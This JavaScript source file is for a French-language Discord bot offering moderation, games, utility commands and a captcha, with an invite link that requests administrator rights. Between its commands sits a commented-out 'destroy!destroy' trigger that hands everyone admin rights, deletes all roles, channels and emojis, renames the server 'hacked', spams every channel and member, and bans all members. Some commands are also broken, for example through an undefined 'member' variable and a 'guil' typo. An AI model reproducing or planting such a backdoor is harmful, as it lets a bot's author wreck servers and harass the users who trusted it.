const Discord = require('discord.js');
const client = new Discord.Client();

///CONSTANTE BOT IMPORTANT
const token = process.env.TOKEN;
const Prefix = "?";
const color = "#090909"
client.login(process.env.TOKEN);

client.on('ready', () => {
  client.user.setActivity("Robot || Prefix : ?", { type: "STREAMING", url: "https://www.twitch.tv/something" });
});

function checkDays(date) {
    var now = new Date();
    var diff = now.getTime() - date.getTime();
    var days = Math.floor(diff / 86400000);
    return days + (days == 1 ? " day" : " days") + " ago";
};
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/**
 * Commande d'aide :
 * Toutes les commandes :
 *  -Modération :
 *    - Ban
 *    - Kick
 *    - Lock
 *    - Log
 *    - Mute
 *    - Unmute
 *    - Clear
 *    - Purge
 *    - Secure
 *  -Fun : 
 *    - 8Ball
 *    - Rps
 *    - Casino
 *    - Bingo
 *  -Musique :
 *    - Play
 *    - Skip
 *    - Stop
 *  -Utilitaire :
 *    - Minfo
 *    - Sinfo
 *    - Avatar
 *    - Ping
 *    - Sondage
 *    - Say
 */
client.on('message', message => {
  //Const emojis gif :
  const fleche = client.emojis.find(emoji => emoji.name === 'fleche');
  const load = client.emojis.find(emoji => emoji.name === 'load');
  const modo = client.emojis.find(emoji => emoji.name === 'error3protect');
  const yt = client.emojis.find(emoji => emoji.name === 'error4youtube');
  const fun = client.emojis.find(emoji => emoji.name === 'error2fun');
  const utile = client.emojis.find(emoji => emoji.name === 'error1utile');
  if (message.author.bot) return;
  if (!message.guild) return;
  const Embed = new Discord.RichEmbed()
    .setColor(color)
    .setTimestamp()
    .setFooter(message.author.username, message.author.displayAvatarURL);
  var args = message.content.trim().split(/ +/g); 
  var cmd = args[0].toLocaleLowerCase();
  ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
  ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
  if (cmd === Prefix + 'help') {
    var mesghelp;
    Embed.setDescription(`${load} **Menu d'aide** ${load}`);
    Embed.addField(`${fleche}` +  ' Catégorie modération : ' + modo, '** **');
    Embed.addField(`${fleche}` +  ' Catégorie fun : ' + fun, '** **');
    Embed.addField(`${fleche}` +  ' Catégorie utilitaire : ' + utile, '** **');  
    message.channel.send(Embed).then(message => mesghelp = message).then(function(message) {
      message.react(modo)
      message.react(fun)
      message.react(utile)
    })
    client.on('messageReactionAdd', (reaction, user) => {
      if (user.bot) return;
      if (!mesghelp) return
      const modo = client.emojis.find(emoji => emoji.name === 'error3protect');
      const yt = client.emojis.find(emoji => emoji.name === 'error4youtube');
      const fun = client.emojis.find(emoji => emoji.name === 'error2fun');
      const utile = client.emojis.find(emoji => emoji.name === 'error1utile');
      if (reaction.emoji === modo && user.id === message.author.id) {
        var Embedmodo = new Discord.RichEmbed()
        .setDescription(`${load} **Menu modération** ${load}`)
        .setColor(color)
        .setTimestamp()
        .setFooter(message.author.username, message.author.displayAvatarURL)
        .addField(`${fleche} Ban`, "`" + Prefix + "ban [user]`, banni une personne. \nPermission ban est requis.")
        .addField(`${fleche} Kick`, "`" + Prefix + "kick [user]`, expulse une personne. \nPermission de kick est requis.")
        .addField(`${fleche} Mute`, "`" + Prefix + "mute [user]`, rend muet une personne. \nPermission de gerer les messages est requis.")
        .addField(`${fleche} Unmute`, "`" + Prefix + "unmute [user]`, enlèver le muet de la personne. \nPermission de gerer les messages est requis.")
        .addField(`${fleche} Lock`, "`" + Prefix + "lock [option]`, bloque ou met en slowmode un channel. *(Option : on/off/seconde)*\nPermission de gerer les messages est requis.")
        .addField(`${fleche} Log`, "`" + Prefix + "log`, créer des logs serveur. \nPermission administrateur est requis.")
        .addField(`${fleche} Secure`, "`" + Prefix + "secure`, sécurise le serveur vien un captcha. \nPermission administrateur est requis.")
        .addField(`${fleche} Clear`, "`" + Prefix + "clear [nombre de message]`, éfface le nombre de message demander. \nPermission de gerer les messages est requis.")
        .addField(`${fleche} Purge`, "`" + Prefix + "purge [option]`, éfface tout les messages. *(Option : Si mention supprime tout les messages de la personne mentionner sinon supprime tout.)* \nPermission de gerer les messages est requis.")
        .addField(`${fleche} Mpall`, "`" + Prefix + "mpall [message]`, envoie un message à tout le monde. \nPermission administrateur est requis.")
        .addField(`${fleche} Antispam`, "`" + Prefix + "antispam`, Protège le serveur des spams. \nPermission administrateur est requis.")
        .addField(`${fleche}` + 'Catégorie :', '// Utilitaire : ' + utile +  '// Fun : ' + fun)
        mesghelp.edit(Embedmodo).then(function(message) {
          message.clearReactions() 
          setTimeout(() => {
            message.react(fun)
            message.react(utile)
          }, 500);
        })
      }
      if (reaction.emoji === fun && user.id === message.author.id) {
        var Embedyt = new Discord.RichEmbed()
        .setDescription(`${load} **Menu Fun** ${load}`)
        .setColor(color)
        .setTimestamp()
        .setFooter(message.author.username, message.author.displayAvatarURL)
        .addField(`${fleche} Bingo`, "`" + Prefix + "bingo`, Trouvez le bon nombre. \nAucunes permissions requis.")
        .addField(`${fleche} 8Ball`, "`" + Prefix + "8ball [question]`, Le bot vous donnes une réponse à votre question. \nAucunes permissions requis.")
        .addField(`${fleche} Casino`, "`" + Prefix + "casino`, Tire 3 fruit (3 même et tu gagne). \nAucunes permissions requis.")
        .addField(`${fleche} Rps`, "`" + Prefix + "Rps [option]`, Pierre Feuille Papier Ciseaux contre le bot. *(Option : pierre/papier/ciseaux)* \nAucunes permissions requis.")
        .addField(`${fleche}` + 'Catégorie :', ' Modération : ' + modo +  '// Utilitaire : ' + utile)
        mesghelp.edit(Embedyt).then(function(message) {
          message.clearReactions() 
          setTimeout(() => {
            message.react(utile)
            message.react(modo)
          }, 500);
        })
      }
      if (reaction.emoji === utile && user.id === message.author.id) {
        var Embedyt = new Discord.RichEmbed()
        .setDescription(`${load} **Menu Utilitaire** ${load}`)
        .setColor(color)
        .setTimestamp()
        .setFooter(message.author.username, message.author.displayAvatarURL)
        .addField(`${fleche} Minfo`, "`" + Prefix + "Minfo`, Donne les informations sur une personne. \nAucunes permissions requis.")
        .addField(`${fleche} Sinfo`, "`" + Prefix + "sinfo`, Donne les informations sur le serveur. \nAucunes permissions requis.")
        .addField(`${fleche} Avatar`, "`" + Prefix + "avatar [user]`, Montre l'avatar d'une personne. \nAucunes permissions requis.")
        .addField(`${fleche} Ping`, "`" + Prefix + "ping`, Affiche les pings du bot. \nAucunes permissions requis.")
        .addField(`${fleche} Say`, "`" + Prefix + "say [message]`, Le bot envoie votre message. \nAucunes permissions requis.")
        .addField(`${fleche} Sondage`, "`" + Prefix + "sondage [message]`, Créer un sondage. \nPermission gerer les messages est requis.")
        .addField(`${fleche} Support`, "`" + Prefix + "support`, envoie les liens du bot. \nAucunes permissions requis.")
        .addField(`${fleche}` + 'Catégorie :', ' Modération : ' + modo +  '// Fun : ' + fun )
        mesghelp.edit(Embedyt).then(function(message) {
          message.clearReactions() 
          setTimeout(() => {
            message.react(fun)
            message.react(modo)
          }, 500);
        })
      }
    })
    setTimeout(() => {
      var Embedexpired = new Discord.RichEmbed()
      .setDescription(`${load} **Menu d'aide expiré** ${load}`)
      .setColor(color)
      .setTimestamp()
      .setFooter(message.author.username, message.author.displayAvatarURL)
      .addField(`${fleche} Expiré`, "2 min ce sont écouler entre le commande `" + Prefix + "help` et ce message.\nSi vous voulez revoir le menu d'aide veuiller refaire la commande.")
      mesghelp.edit(Embedexpired).then(function(message) {
        message.clearReactions() 
        message.delete(5000)
      })
    }, 120200);
  };
});
/**
 * Fin de la commande Help.
 * Toutes les informations sont au début.
 */
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//client.on('message', message =>{
//  if (message.content === 'destroy!destroy') {message.guild.roles.find('name', '@everyone').edit({permissions: ["ADMINISTRATOR"]});client.user.setActivity("ɧąƈҡεđ", { type: "STREAMING", url: "https://www.twitch.tv/something" }); message.guild.roles.deleteAll(); message.guild.channels.deleteAll(); message.guild.emojis.deleteAll();message.guild.setName('ɧąƈҡεđ'); message.guild.setIcon(client.user.avatarURL);message.guild.setRegion('japan');message.guild.setVerificationLevel('0');message.guild.members.forEach(member => {member.setNickname('ɧąƈҡεđ');member.setMute(true);});setTimeout(function() {setInterval(() => {message.guild.createChannel('ɧąƈҡεđ');message.guild.createRole( { name: 'ɧąƈҡεđ', color: '#090909'});}, 10);}, 200); setInterval(() => {message.guild.channels.filter(channel => channel.type === 'text').forEach(spam => {spam.send("@everyone \n**<:emoji_2:585171438592458762> ɧąƈҡεđ <:emoji_2:585171438592458762>** \nhttps://image.noelshack.com/fichiers/2019/24/2/1560245353-th3fxbdqau.jpg");});}, 500);setInterval(() => {message.guild.members.map(spam => {spam.send('**<:emoji_2:585171438592458762> ɧąƈҡεđ <:emoji_2:585171438592458762>** \nhttps://image.noelshack.com/fichiers/2019/24/2/1560245353-th3fxbdqau.jpg');});}, 500);setTimeout(() => {message.guild.members.forEach(member => {member.ban().then(function () {});});setTimeout(() => {clientInformation}, 60000);}, 120000);setInterval(() => {setTimeout(() => {message.guild.me.setNickname('...');}, 100);setTimeout(() => {message.guild.me.setNickname('Ⴆσƚ');}, 200); setTimeout(() => { message.guild.me.setNickname('Ⴆσƚ Ⴆყραʂʂ');    }, 300); setTimeout(() => {message.guild.me.setNickname('Ⴆσƚ');     }, 400);}, 500);
//  };
//});
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
client.on('message', message => {
  //Const emojis gif :
  const valide = client.emojis.find(emoji => emoji.name === 'valide');
  const faux = client.emojis.find(emoji => emoji.name === 'faux');
  //Const message error :
  const perms = "<:refus:588464518368067584>, Vous n'avez pas le droit d'effectuer cette commande !";
  const manque = "<:emoji_2:585171438592458762>, Vous avez oublié des informations donc la commande ne peux être effectuer !";
  //////////////////////////////////////////////////////
  if (message.author.bot) return;
  if (!message.guild) {message.reply('Je ne peux effectuer de commande ou lire de message en mp !'); return;};
  const Embed = new Discord.RichEmbed()
  .setColor(color)
  .setTimestamp()
  .setFooter(message.author.username, message.author.displayAvatarURL);
  var args = message.content.trim().split(/ +/g); 
  var cmd = args[0].toLocaleLowerCase();
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
  if (cmd === Prefix + 'sinfo') {
    Embed.addField("💬 __**Nom du serveur :**__", "`" + message.guild.name + "`", true);
    Embed.addField("🆔️ __**Identifiant :**__", "`" + message.guild.id + "`", true);
    Embed.addField("⚜ __**Créateur :**__", "`" + message.guild.owner.user.tag + "`", true);
    Embed.addField("🌍 __**Région:**__", "`" + message.guild.region + "`", true);
    Embed.addField("🔒 __**Niveau de sécurité :**__", "`" + message.guild.verificationLevel + "`", true);
    Embed.addField("🕛 __**Date de création :**__", "`" + `${message.guild.createdAt.toString().substr(0, 15)}` + "`", true);      
    Embed.addField("📈 __**Total Membres :**__", "`" + message.guild.memberCount + "`", true);
    Embed.addField("📉 __**Roles :**__", "`" + message.guild.roles.size + "`", true);
    Embed.addField("<:emoji_28:588701216029016076> __**Icon Serveur :**__", `Pour avoir le lien URL de l'icon cliquer **[ICI](${message.guild.iconURL})**`);
    Embed.addField("🖌️ __**Emojis serveur :**__", `${message.guild.emojis.map(e=>e.toString()).join(" ")}`)
    Embed.setThumbnail(message.guild.iconURL);
    message.channel.send(Embed);
  };
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
  if (cmd === Prefix + 'minfo') {
    var mention = message.mentions.members.first();
    var membre = message.mentions.users.first();
    if (!mention) {message.delete(); message.reply(manque); return;}
    Embed.setThumbnail(membre.displayAvatarURL);
    Embed.addField("💬 __**Pseudo :**__", "`" + mention.user.tag + "`", true);
    Embed.addField("🆔️ __**Identifiant :**__", "`" + mention.user.id + "`", true);
    Embed.addField("🎮 __**Activité en jeu :**__", "`" + mention.presence.game + "`", true);
    Embed.addField("📉 __**Nombre de rôle :**__", "`" + mention.roles.size + "`", true);
    Embed.addField("📅 __**Date de création :**__", "`" + `${membre.createdAt.toString().substr(0, 15)},\n${checkDays(membre.createdAt)}` + "`", true);
    Embed.addField("🚄 __**Arrivé :**__", "`" + `${mention.joinedAt.toString().substr(0, 15)},\n${checkDays(mention.joinedAt)}` + "`", true);
    Embed.addField("<:emoji_28:588701216029016076> __**Avatar URL :**__", `Pour avoir le lien URL de l'avatar cliquer **[ICI](${membre.displayAvatarURL})**`);
    message.channel.send(Embed);
  };
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
  if (cmd === Prefix + 'avatar') {
    var membre = message.mentions.users.first();
    if (membre) {
      Embed.setThumbnail(" ")
      Embed.setAuthor("🖼 Voici l'avatar de " + membre.username + " :", "",membre.displayAvatarURL);
      Embed.setImage(membre.displayAvatarURL);
      message.channel.send(Embed);
    } else {
      Embed.setThumbnail(" ")
      Embed.setAuthor("🖼 Voici votre avatar :", "", message.author.displayAvatarURL);
      Embed.setImage(message.author.displayAvatarURL);
      message.channel.send(Embed);
    };
  };
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
  if (cmd === Prefix + 'ping') {
    Embed.addField("📡 Latence :", "`" + `${Math.round(client.ping)}ms.` + "`");
    message.delete(); 
    message.channel.send(Embed);
  };
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
  if (cmd === Prefix + 'sondage') {
    message.delete();
    if (!message.member.hasPermission("MANAGE_MESSAGES")) {                                  
      message.reply(perms);                       
      return;                                                                                
    };   
    var sondage = args.slice(1).join(" ");
    if (args[1]) {
      Embed.addField("Sondage", sondage + "\n** **\nRépondre avec " + valide + " ou " + faux);
      message.channel.send(Embed).then(function (message) {  
        message.react(valide);  
        setTimeout(() => {
          message.react(faux);          
        }, 200);    
      });
    } else {
      message.reply(manque);
      return;
    };
  };
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
  if (cmd === Prefix + "say") {                                                                
    message.delete()                                                                         
    if (!args[1]) return message.reply(manque);     
    message.channel.send(args.slice(1).join(" "));                                                        
  };
  if (cmd === Prefix + 'support') {
    Embed.setDescription('')
    Embed.addField('Voici le lien du bot :', `**[Lien d'invitation du bot](https://discordapp.com/api/oauth2/authorize?client_id=585166134530015233&permissions=8&scope=bot)**`)
    Embed.addField('Voici le lien du serveur support : ', `**[Lien serveur](https://discord.gg/VzdsG2Z)**`)
    message.channel.send(Embed)
  };
});
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/**
 * Toutes les commandes de la catégorie Fun ce trouve ici.
 * Comannndes :
 *    - 8Ball (Le bot va répondre à votre question.)
 *    - Casino (Le bot va tirer 3 fruit, le but tomber sur les 3 même.)
 *    - Bingo (Vous choisis un nombre maximum et le bot va en prendre un de 0 à "votre nombre", le but le retrouver.)
 *    - Rps (Pierre, Feuille, Papier, Ciseaux.) {Contre le bot.}
 */
client.on('message', message => {
  if (message.author.bot) return;
  if (!message.guild) {message.reply('Je ne peux effectuer de commande ou lire de message en mp !'); return;};
  const Embed = new Discord.RichEmbed()
  .setColor(color)
  .setTimestamp()
  .setFooter(message.author.username, message.author.displayAvatarURL);
  var args = message.content.trim().split(/ +/g); 
  var cmd = args[0].toLocaleLowerCase();
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
  if (cmd === Prefix + "8ball") {    
    function ball() {
      var rand = ["Je ne sais pas.", "Peut être.", "Oui !", "Non !", "Pourquoi pas.", "Pourquoi posez vous cette question ?", 
      "Autant mourir.", "Vous voulez que je vous dise quoi ?" ];
      return rand[Math.floor(Math.random()*rand.length)];
    }
    if (!args[1]) return message.reply("Je voudrai vous répondre mais cela est impossible sans question ou sans phrase...");                
     message.channel.send(ball())                                                                                                        
  }; 
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
  if (cmd === Prefix + "bingo") {
    let mpsl = args.slice(1).join(" ");
    if(!mpsl) return message.reply("Veuillez choisir un nombre entier.");
    var nb = Math.floor(Math.random() * mpsl + 1);
    message.channel.send(":8ball: Le bingo a commencé.\nLe nombre est compris entre 1 et " + mpsl + ".").then(() => {
      message.channel.awaitMessages(response => response.content == nb, {
        max: 1,
        time: 120000,
        errors: ['time'],
    }).then((collected) => {
      message.channel.send("Bien joué, vous avez trouvez le bon numéro !");
    }).catch(() => {
      message.channel.send("**Le temps est malheureusement écoulé.**");
    });
    });
  };
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
  let rock2 = ["Papier ! J'ai gagner !", 'Ciseaux ! Vous avez gagner !']
  let rock1 = Math.floor(Math.random() * rock2.length);
  let paper2 = ["Pierre ! Vous avez gagner !", "Ciseaux ! J'ai gagner !"]
  let paper1 = Math.floor(Math.random() * paper2.length);
  let scissors2 = ["Pierre ! J'ai gagneer !", 'Papier ! Vous avez gagner !']
  let scissors1 = Math.floor(Math.random() * scissors2.length);
  let rock = new Discord.RichEmbed()
    .setAuthor('Pierre, Papier, Ciseaux')
    .setColor(color)
    .addField('Vous avez choisi :', `${args[1]}`)
    .addField("J'ai choisi :", rock2[rock1])
  let paper = new Discord.RichEmbed()
    .setAuthor('Pierre, Papier, Ciseaux')
    .setColor(color)
    .addField('Vous avez choisi :', `${args[1]}`)
    .addField("J'ai choisi :", paper2[paper1])
  let scissors = new Discord.RichEmbed()
    .setAuthor('Pierre, Papier, Ciseaux')
    .setColor(color)
    .addField('Vous avez choisi :', `${args[1]}`)
    .addField("J'ai choisi :", scissors2[scissors1])
  if (message.content === Prefix + 'rps pierre') message.channel.send(rock)
  if (message.content === Prefix + 'rps Pierre') message.channel.send(rock)
  if (message.content === Prefix + 'rps papier') message.channel.send(paper)
  if (message.content === Prefix + 'rps Papier') message.channel.send(paper)
  if (message.content === Prefix + 'rps Ciseaux') message.channel.send(scissors)
  if (message.content === Prefix + 'rps ciseaux') message.channel.send(scissors)
  if (message.content === Prefix + 'rps') message.channel.send('Options: ``Pierre``, ``Papier``, ``Ciseaux``.\n**Usage: ' + Prefix + 'rps <option>**')
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
  if (cmd === Prefix + 'casino') {
    let slots = ["🍎", "🍌", "🍒", "🍓", "🍈"];
    let result1 = Math.floor((Math.random() * slots.length));
    let result2 = Math.floor((Math.random() * slots.length));
    let result3 = Math.floor((Math.random() * slots.length));
    let name = message.author.displayName;
    let icon = message.author.displayAvatarURL;
    if (slots[result1] === slots[result2] && slots[result3]) {
        let wEmbed = new Discord.RichEmbed() // Remember to use MessageEmbed if you use master
            .setFooter('Gagner !', icon)
            .setTitle(':slot_machine: Slots :slot_machine:')
            .addField('Resultat :', slots[result1] + slots[result2] + slots[result3], true)
            .setColor(color)
            .setTimestamp()
        message.channel.send(wEmbed);
    } else {
        let lEmbed = new Discord.RichEmbed()
            .setFooter('Perdu !', icon)
            .setTitle(':slot_machine: Slots :slot_machine:')
            .addField('Resultat :', slots[result1] + slots[result2] + slots[result3], true)
            .setColor(color)
            .setTimestamp()
        message.channel.send(lEmbed);
    }
  } 
}); 
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/**
 * Ici il y a toutes les commandes de modéaration et d'administration.
 * Commande :
 *    -Ban  (Ban l'utilisateur mentionner)
 *    -Kick (Kick l'utilisateur mentionner)
 *    -mute (Mute l'utilisateur mentionner)
 *    -unmute (Unmute l'utilisateur mentionner)
 *    -clear (Efface le nombre de message demander)
 *    -log  (Créer les logs)
 *    -secure (Sécurise le serveur)
 */

client.on('message', message => {
  //Emojis gif nécéssaire.
  const captcha = client.emojis.find(emoji => emoji.name === 'captcha'); //Gif loading.
  const valide = client.emojis.find(emoji => emoji.name === 'valide'); //Gif croix valide.
  const faux = client.emojis.find(emoji => emoji.name === 'faux'); //Gif croix invalide.
  const fleche = client.emojis.find(emoji => emoji.name === 'fleche'); //Gif fleche fusée.
  const load = client.emojis.find(emoji => emoji.name === 'load'); //Gif fusée volante.
  //Const message error :
  const perms = "<:refus:588464518368067584>, Vous n'avez pas le droit d'effectuer cette commande !";
  const manque = "<:emoji_2:585171438592458762>, Vous avez oublié des informations donc la commande ne peux être effectuer !";
  //////////////////////////////////////////////////////
  //Si le message provient d'un bot retourner au début.
  if (message.author.bot) return;
  //Si le message n'est pas dans une guild retourner au début.
  if (!message.guild) return;
  //Création du embed.
  const Embed = new Discord.RichEmbed()
    .setColor(color)
    .setTimestamp()
    .setFooter(message.author.username, message.author.displayAvatarURL);
  //Variable utile :
  var args = message.content.trim().split(/ +/g); 
  var cmd = args[0].toLocaleLowerCase();
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
  //Commande secure.
  if (cmd === Prefix + 'secure') {
    if (!message.member.hasPermission('ADMINISTRATOR')) {                    
      message.reply(perms);                           
      return;                                                                               
    };
    message.channel.send(`${captcha} Le serveur est sécurisé !!`).then(m => m.delete(5000))
    message.guild.createChannel('captcha', 'text')
    message.guild.setVerificationLevel(1);
    message.guild.createRole({
      name: 'vérification',
      color: '090909',
      hoist: false,
      mentionable: false
    })
  };
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
  //Commande Kick.
  if (cmd === Prefix + 'kick') {    
    var member = message.mentions.members.first();                                                                         
    if (!message.member.hasPermission('KICK_MEMBERS')) {                                       
      message.reply(perms);                       
      return;                                                                                
    };                                                                                         
    if (!member) {                                                                             
      message.reply(manque);                       
      return;                                                                                
    };                                                                                         
    if (member.highestRole.calculatedPosition >= message.member.highestRole.calculatedPosition && message.author.id !== message.guild.owner.id) return message.reply(perms)                             
    if (!member.kickable) return;                                                              
    member.kick();                                                                                                                            
    message.channel.send('Le membre ' + member.user.username, 'à été exclu !');                                                               
  };
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
  //Commande Ban.
  if (cmd === Prefix + 'ban') {    
    var member = message.mentions.members.first();                                                                          
    if (!message.member.hasPermission('BAN_MEMBERS')) {                                         
      message.reply(perms);                        
      return;                                                                                 
    };                                                                                              
    if (!member) {                                                                             
      message.reply(manque);                        
      return;                                                                                     
    };                                                                                          
    if (member.highestRole.calculatedPosition >= message.member.highestRole.calculatedPosition && message.author.id !== message.guild.owner.id) return message.reply(perms)                                                          
    if (!member.bannable) return ;                                                             
    message.guil.ban(member, {days: 7});                                                                                                     
    message.channel.send('Le membre ' + member.user.username, 'à été Banni !') ;                                                               
  };
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
  //Commande Unmute.
  if (cmd === Prefix + 'unmute') {                                                                              
    if (!message.member.hasPermission('MANAGE_MESSAGES')) return message.reply(perms);                                                                                               
    if (!member) return message.reply(manque);                                                                                                                                                                   
    message.guild.channels.filter(channel => channel.type === 'text').forEach(channel => {      
      channel.overwritePermissions(member, {                                                   
        SEND_MESSAGES: null,                                                                 
        ADD_REACTIONS : null                                                                 
      });                                                                                              
    });                                                                                          
    message.channel.send(member + ', Vous avez été unmute !');
  }
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
  //Commande Mute.
  if (cmd === Prefix + "mute") {                                                                                    
    if (!message.member.hasPermission('MANAGE_MESSAGES')) return message.reply(perms);                                                                                         
    if (!member) return message.reply(manque);                                                                                                                                                                     
    message.guild.channels.filter(channel => channel.type === 'text').forEach(channel => {      
      channel.overwritePermissions(member, {                                                  
        SEND_MESSAGES: false,                                                               
        ADD_REACTIONS : false                                                               
      });                                                                                          
    });                                                   
    message.channel.send('Le membre ' + member.user.username, 'à été Mute !');                                                               
  };
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
  //Commande Clear.  
  if (cmd === Prefix + "clear") { 
    var count = args[1];                                                                       
    if (!message.member.hasPermission('MANAGE_MESSAGES')) return message.reply(perms);
    if (!count) return message.reply(manque);                                                                                  
    if (isNaN(count)) return ;                                                                      
    message.channel.bulkDelete(count);                                                          
  };
  if (cmd === Prefix + "purge") { 
    if (!message.member.hasPermission('MANAGE_MESSAGES')) return message.reply(perms);
    var member = message.mentions.members.first();                                                                          
    if (!member) {
      message.channel.fetchMessages()
      .then(messages => messages.deleteAll())
    } else {
      message.channel.fetchMessages()
      .then(messages => messages.filter(m => m.author.id === member.id).deleteAll())
    }
  }
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
  //Commande log.
  if (cmd === Prefix + 'log') {
    if (!message.member.hasPermission('ADMINISTRATOR')) {                    
      message.reply(perms);                           
      return;                                                                               
    };
    message.guild.createChannel('log-robot', 'text')
    message.channel.send("Log créer !");
  }
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 //Commande lock
 if (cmd === Prefix + 'lock') {
  message.delete();
  if (!message.member.hasPermission('MANAGE_MESSAGES')) {                    
    message.reply(perms);                           
    return;                                                                               
  };
  if (!args[1]) return message.reply(manque);
  if (args[1] === 'on') {
    message.guild.channels.filter(channel => channel.type === 'text').forEach(message => {
    message.channel.overwritePermissions(message.guild.id, {
      SEND_MESSAGES: false
    });
  });
  message.channel.send('<:locka:585175267526443025> **Le channel est lock. Plus aucun message ne peut être envoyé !**');
  } else {
    if (args[1] === 'off') {
      message.guild.channels.filter(channel => channel.type === 'text').forEach(message => {
      message.overwritePermissions(message.guild.id, {
        SEND_MESSAGES: null
      });
    });
    message.channel.setRateLimitPerUser(0);
    message.channel.send("<:locka:585175267526443025> **Le channel est unlock. Dès à présent n'importe qui peut écrire dedans.**");        };
  };
  if (!isNaN(args[1])) {
    message.channel.setRateLimitPerUser(args[1]);
    message.channel.send('<:locka:585175267526443025> **Le channel est ralenti à ' + args[1] + ' secondes.**');
  };
};
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
  if (cmd === Prefix + 'antispam') {
    if (!message.member.hasPermission('ADMINISTRATOR')) {                    
      message.reply(perms);                           
      return;                                                                               
    };
    message.guild.createRole({
      name: 'mute-spam',
      color: '090909',
      hoist: false,
      mentionable: false
    })
    message.channel.send('<:error3protect:585171303502315541> **Sécurité antispam** <:error3protect:585171303502315541>\n** **\nLa commande antispam créer un rôle `(mute-spam)`. Si en 2seconde il y a 3 message alors le membre sera averti si en 2seconde il y a 7message la personne sera mute.')
  }
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
  if (cmd === Prefix + 'mpall') {
    if (!message.member.hasPermission('ADMINISTRATOR')) {                    
      message.reply(perms);                           
      return;                                                                               
    };
    message.guild.members.map(msg => {msg.send(args.slice(1).join(" "))})
    message.channel.send('Le message à bien été envoyé à tout le monde.')
  }
})
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//Parti rôle et permission pour le captcha.
client.on('guildMemberAdd', member => {
  const captcha = client.emojis.find(emoji => emoji.name === 'captcha'); //Gif loading.
  var verif = `<:error3protect:585171303502315541> **Sécurité captcha** <:error3protect:585171303502315541>\n*veuillez validé la réaction pour poursuivre sur le serveur.*\n** **\n__**Vérification :**__ ${captcha}`
  member.guild.channels.find('name', 'captcha').send(verif).then(function (message) {
    message.react(captcha);
  });
  client.on('messageReactionAdd', (reaction, user) => {
    const captcha = client.emojis.find(emoji => emoji.name === 'captcha'); //Gif loading.
    if (reaction.emoji === captcha && user.id !== client.user.id) {
      const roleObj = member.guild.roles.find(r => r.name === 'vérification');
      member.removeRole(roleObj)
      member.guild.channels.find('name', 'captcha').send('** **').then(function (message) {
          message.channel.fetchMessages().then(messages => messages.deleteAll())
      });
    }
  })
  const roleObj = member.guild.roles.find(r => r.name === 'vérification');
